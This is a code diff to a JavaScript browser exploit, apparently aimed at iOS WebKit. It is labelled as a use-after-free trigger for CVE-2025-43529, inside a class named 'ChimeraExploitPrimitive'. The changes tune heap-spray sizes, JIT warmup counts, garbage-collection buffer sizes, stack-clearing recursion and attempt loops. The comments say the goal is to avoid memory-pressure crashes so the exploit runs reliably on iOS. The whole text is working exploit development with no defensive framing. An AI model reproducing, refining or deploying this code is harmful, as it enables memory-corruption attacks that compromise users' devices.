@@ -5820,7 +5820,8 @@ class ChimeraExploitPrimitive {
 // UAF TRIGGER — CVE-2025-43529
 // =========================================================================
 
-const uafArray = new Array(0x400000).fill(1.1);
+// 1M elements is sufficient to push A to old space (vs 4M which wastes ~32MB)
+const uafArray = new Array(0x100000).fill(1.1);
 const uafArrayIndex = uafArray.length - 1;
 let uafReclaimed = [];
 
@@ -5838,14 +5839,17 @@ const preTargets = {
   inlineTemplate2: { prop0: 1.1, prop1: 2.2, prop2: 3.3, prop3: 4.4 },
 };
 
-// Configuration
+// Configuration — tuned to avoid memory pressure crash on iOS
 const CONFIG = {
-  JIT_WARMUP: 1000,
-  MAX_ATTEMPTS: 15000,
-  SPRAY_PER_ATTEMPT: 64,
-  ALLOC_MOD: 5,
+  JIT_WARMUP: 800,
+  MAX_ATTEMPTS: 5000,
+  SPRAY_PER_ATTEMPT: 32,
+  ALLOC_MOD: 3,            // 1-3 GC buffers per attempt (was 1-5)
   INNER_K: 10,
-  RECURSIVE_DEPTH: 800,
+  RECURSIVE_DEPTH: 400,    // shallower recursion (was 800)
+  GC_BUFFER_SIZE: 0x200000, // 2MB per GC trigger (was 8MB)
+  MAX_SPRAY_TOTAL: 8000,   // cap total spray arrays to limit memory
+  YIELD_INTERVAL: 200,     // yield to event loop every N attempts
 };
 
 // Core UAF trigger — must be JIT compiled
@@ -5858,7 +5862,7 @@ function triggerUAF(flag, k, allocCount) {
   a[0] = 1.1; // Creates butterfly in regular heap
 
   for (let j = 0; j < allocCount; ++j) {
-    forGC.push(new ArrayBuffer(0x800000));
+    forGC.push(new ArrayBuffer(CONFIG.GC_BUFFER_SIZE));
   }
   A.p2 = forGC;
 
@@ -5887,7 +5891,7 @@ function triggerUAF(flag, k, allocCount) {
 // Stack clearing to remove conservative GC roots
 function recursive(n) { if (n === 0) return; n = n | 0; recursive(n - 1); }
 function safeRecursive(d) { try { recursive(d); } catch (e) {} }
-function clearStack() { for (let i = 0; i < 50; i++) safeRecursive(CONFIG.RECURSIVE_DEPTH); }
+function clearStack() { for (let i = 0; i < 20; i++) safeRecursive(CONFIG.RECURSIVE_DEPTH); }
 
 // =========================================================================
 // MAIN EXPLOIT ENTRY POINT
@@ -5919,9 +5923,14 @@ r.si = async function () {
   uafReclaimed = [];
 
   for (let k = 0; k < CONFIG.MAX_ATTEMPTS; ++k) {
+    // Cap total spray arrays to prevent OOM
+    if (uafReclaimed.length > CONFIG.MAX_SPRAY_TOTAL) {
+      uafReclaimed.length = 0;
+    }
+
     triggerUAF(false, CONFIG.INNER_K, (k % CONFIG.ALLOC_MOD) + 1);
     clearStack();
-    for (let i = 0; i < 3; ++i) new ArrayBuffer(0x4000);
+    for (let i = 0; i < 2; ++i) new ArrayBuffer(0x4000);
 
     let freed;
     try { freed = uafArray[uafArrayIndex].p1.p1; } catch (e) { continue; }
@@ -5939,7 +5948,7 @@ r.si = async function () {
     }
 
     if (!win) {
-      if (k % 1000 === 0) {
+      if (k % CONFIG.YIELD_INTERVAL === 0) {
         window.log("[STAGE1-CHIMERA] Attempt " + k + "/" + CONFIG.MAX_ATTEMPTS + "...");
         await new Promise(r => setTimeout(r, 1));
       }
